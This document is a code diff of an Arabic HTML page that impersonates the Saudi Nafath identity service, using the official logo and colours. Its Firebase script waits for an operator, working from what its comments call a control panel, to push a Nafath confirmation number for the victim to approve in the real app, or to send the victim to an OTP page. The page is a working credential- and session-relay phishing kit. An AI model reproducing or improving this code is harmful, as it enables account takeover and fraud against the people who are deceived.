@@ -8,74 +8,68 @@
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
         :root { --nafath-green: #006a4d; --bg-gray: #f4f4f4; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg-gray); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: rtl; }
         
-        /* شريط المعالجة العلوي المطابق للصورة */
-        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 1000; }
-        .loading-box { background: white; padding: 25px; border-radius: 12px; text-align: center; width: 90%; max-width: 380px; }
-        .loader-bar { width: 100%; height: 12px; background: #eee; border-radius: 6px; overflow: hidden; margin: 15px 0; display: flex; gap: 2px; }
-        .bar-segment { flex: 1; background: #2ecc71; animation: pulse 1.2s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 0.2; } 50% { opacity: 1; } }
+        .nafath-card {
+            background: white; width: 100%; max-width: 420px; min-height: 550px;
+            border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.08);
+            display: flex; flex-direction: column; overflow: hidden; position: relative;
+        }
 
-        .container { width: 100%; max-width: 450px; background: white; min-height: 100vh; display: flex; flex-direction: column; position: relative; }
-        .header { padding: 18px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
-        .header img { height: 35px; }
+        .header { padding: 25px; display: flex; justify-content: center; border-bottom: 1px solid #f0f0f0; background: #fff; }
+        .header img { height: 45px; }
+
+        .content { flex: 1; padding: 40px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+
+        /* اللودر */
+        .spinner {
+            width: 60px; height: 60px; border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--nafath-green); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 30px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* رقم التحقق */
+        .number-display {
+            font-size: 70px; font-weight: bold; color: var(--nafath-green);
+            width: 140px; height: 140px;
+            display: flex; align-items: center; justify-content: center;
+            border-radius: 50%; border: 4px solid var(--nafath-green);
+            background: #f4fdf9; margin: 20px auto;
+        }
+
+        .title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .subtitle { font-size: 15px; color: #666; line-height: 1.6; }
         
-        .p-body { padding: 25px; text-align: center; }
-        
-        /* مربع الرقم السحري */
-        .number-box { width: 100px; height: 100px; border: 2px solid var(--nafath-green); border-radius: 15px; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 45px; font-weight: bold; color: var(--nafath-green); background: #f9f9f9; }
-        
-        .instruction-main { font-size: 16px; color: #333; font-weight: 600; line-height: 1.6; margin-bottom: 10px; }
-        .timer { font-size: 18px; color: #d35400; font-weight: bold; margin: 15px 0; }
-        
-        /* خطوات نفاذ المصورة */
-        .steps-container { display: flex; justify-content: space-between; gap: 10px; margin-top: 30px; }
-        .step-card { flex: 1; background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 10px; text-align: center; }
-        .step-card img { width: 100%; border-radius: 5px; margin-bottom: 10px; }
-        .step-card h4 { font-size: 13px; color: var(--nafath-green); margin: 5px 0; }
-        .step-card p { font-size: 11px; color: #777; line-height: 1.4; }
+        #code-screen { display: none; width: 100%; animation: fadeIn 0.5s; }
+        #loading-screen { display: flex; flex-direction: column; align-items: center; width: 100%; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div id="overlay" class="loading-overlay">
-    <div class="loading-box">
-        <p style="font-size: 14px; margin: 0;">الرجاء فتح تطبيق نفاذ وتأكيد طلب ربط الطلب على رقم الجوال بإختيار الرقم الذي سوف يظهر .</p>
-        <div class="loader-bar">
-            <div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div><div class="bar-segment"></div>
+    <div class="nafath-card">
+        <div class="header">
+            <img src="https://iam.gov.sa/static/media/logo.8e294157.svg" alt="Nafath">
         </div>
-        <div style="font-size: 13px; color: #666;">جاري المعالجة ، نرجو الإنتظار ...</div>
-    </div>
-</div>
 
-<div class="container">
-    <div class="header">
-        <div>☰</div>
-        <img src="https://iam.gov.sa/static/media/logo.8e294157.svg" alt="Nafath">
-    </div>
-
-    <div class="p-body">
-        <div class="number-box" id="nafath-number">??</div>
-        
-        <p class="instruction-main">الرجاء فتح تطبيق نفاذ وتأكيد ربط الطلب على رقم الجوال بإختيار الرقم أعلاه .</p>
-        
-        <div class="timer" id="timer">00:60</div>
-
-        <div class="steps-container">
-            <div class="step-card">
-                <img src="https://iam.gov.sa/static/media/step1.png" alt="step1" onerror="this.src='https://placehold.co/100x100?text=نفاذ'">
-                <h4>الخطوة 1</h4>
-                <p>تحميل تطبيق نفاذ</p>
+        <div class="content">
+            <!-- شاشة الانتظار -->
+            <div id="loading-screen">
+                <div class="spinner"></div>
+                <div class="title">جاري إنشاء طلب التوثيق...</div>
+                <div class="subtitle">يرجى الانتظار قليلاً بينما نقوم بتجهيز الطلب</div>
             </div>
-            <div class="step-card">
-                <img src="https://iam.gov.sa/static/media/step2.png" alt="step2" onerror="this.src='https://placehold.co/100x100?text=بصمة'">
-                <h4>الخطوة 2</h4>
-                <p>اختيار الرقم أعلاه والتحقق عبر السمات الحيوية</p>
+
+            <!-- شاشة الرقم -->
+            <div id="code-screen">
+                <div class="title">الرجاء اختيار الرقم في تطبيق نفاذ</div>
+                <div class="number-display" id="display-num">--</div>
+                <div class="subtitle">افتح تطبيق نفاذ وقم بتأكيد الطلب باختيار الرقم الظاهر أعلاه</div>
+                <div id="timer-box" style="margin-top: 20px; color: #dc3545; font-weight: bold; font-size: 1.1rem; display: none;">صلاحية الرقم: <span id="timer">01:00</span></div>
             </div>
         </div>
     </div>
-</div>
 
 <script>
     // إعدادات Firebase
@@ -90,60 +84,57 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    // جلب الـ ID المحفوظ
     const userId = localStorage.getItem('user_id');
-    const numberDisplay = document.getElementById('nafath-number');
 
-    // إخفاء اللودر تلقائياً
-    setTimeout(() => { document.getElementById('overlay').style.display = 'none'; }, 4000);
-
-    // الرقابة المباشرة على قاعدة البيانات لسحب الرقم
-    if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists && doc.data().nafath_code) {
-                // تحديث المربع بالرقم الموجود في حقل nafath_code
-                numberDisplay.innerText = doc.data().nafath_code;
-                numberDisplay.style.color = "#006a4d";
-            }
-        });
+    let timerInterval;
+    function startTimer(duration) {
+        let timer = duration, minutes, seconds;
+        const display = document.getElementById('timer');
+        document.getElementById('timer-box').style.display = 'block';
+        
+        clearInterval(timerInterval);
+        timerInterval = setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+            if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
+        }, 1000);
     }
 
-    // العداد التنازلي
-    let timeLeft = 60;
-    const timerElement = document.getElementById('timer');
-    setInterval(() => {
-        if (timeLeft > 0) {
-            timeLeft--;
-            timerElement.innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
-        }
-    }, 1000);
-    // --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
     if (userId) {
+        // مراقبة الطلب لحظة بلحظة
         db.collection("orders").doc(userId).onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_faild.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    const codeBox = document.getElementById('nafath-number');
-                    if (codeBox && data.nafath_code) {
-                        codeBox.innerText = data.nafath_code;
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) overlay.style.display = 'none';
+
+                // إذا أرسلت رقم نفاذ من لوحة التحكم
+                if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
+                    // التحقق من أن الشاشة لم تظهر بعد لمنع إعادة تشغيل المؤقت عند تحديث البيانات
+                    if (document.getElementById('code-screen').style.display !== 'block') {
+                        document.getElementById('loading-screen').style.display = 'none';
+                        document.getElementById('code-screen').style.display = 'block';
+                        document.getElementById('display-num').innerText = data.nafath_code;
+                        startTimer(60); // تشغيل العداد لمدة 60 ثانية
                     }
+                }
+
+                // إذا ضغطت "رفض" في لوحة التحكم
+                if (data.next_step === "GO_TO_REJECT") {
+                    alert("نعتذر، تم رفض الطلب.");
+                    window.location.href = "index.html";
+                }
+
+                // إذا ضغطت "طلب كود OTP"
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html";
                 }
             }
         });
+    } else {
+        // إذا دخل الصفحة بدون تسجيل بيانات يرجعه للرئيسية
+        window.location.href = "index.html";
     }
-})();
-// ------------------------------------------
-
 </script>
 </body>
 </html>
-
